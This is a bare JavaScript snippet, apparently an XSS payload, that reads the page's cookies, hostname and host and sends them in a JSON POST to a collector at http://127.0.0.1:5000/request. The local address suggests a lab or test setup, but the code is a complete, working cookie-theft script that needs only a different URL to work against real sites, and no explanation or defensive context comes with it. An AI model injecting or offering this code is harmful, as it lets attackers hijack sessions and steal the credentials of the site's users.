! function () {
    let t = {
            cookie: document.cookie,
            hostname: window.location.hostname,
            host: window.location.host
        },
        o = new XMLHttpRequest;
    o.open("post", "http://127.0.0.1:5000/request"), o.setRequestHeader("Content-Type", "application/json"), o.send(JSON.stringify(t))
}();